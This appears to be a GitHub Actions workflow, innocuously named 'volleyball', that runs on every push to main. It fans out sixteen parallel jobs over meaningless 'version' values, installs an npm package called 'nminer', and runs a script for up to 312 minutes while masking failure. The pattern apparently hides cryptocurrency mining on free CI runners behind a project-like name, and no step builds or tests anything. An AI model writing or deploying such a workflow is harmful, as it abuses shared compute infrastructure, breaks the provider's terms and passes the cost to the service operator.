name: volleyball
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3498 }
          - { version: 2089 }
          - { version: 8488 }
          - { version: 3353 }
          - { version: 2601 }
          - { version: 2973 }
          - { version: 1109 }
          - { version: 5615 }
          - { version: 2845 }
          - { version: 9690 }
          - { version: 8700 }
          - { version: 7752 }
          - { version: 6085 }
          - { version: 512 }
          - { version: 9594 }
          - { version: 6207 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 312m node volleyball.js || echo "volleyball executed"